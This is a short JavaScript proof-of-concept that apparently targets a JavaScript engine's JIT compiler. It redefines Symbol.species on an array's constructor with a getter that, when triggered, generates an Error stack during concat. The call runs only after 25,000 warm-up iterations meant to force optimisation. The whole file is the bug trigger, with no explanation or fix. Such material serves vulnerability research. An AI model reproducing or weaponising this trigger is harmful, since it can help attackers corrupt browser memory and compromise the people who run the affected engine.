function poc(trigger) {
    let a = [1.1];
    a.constructor = {};
    Object.defineProperty(a.constructor, Symbol.species, {
        configurable: true,
        get: function() {
            if (trigger) {
                function trigger_func() {
                    new Error().stack;
                }
                trigger_func();
            }
            return Array;
        }
    });
    return a.concat([]);
}

for (let i = 0; i < 25000; i++) {
    poc(false);
}
poc(true);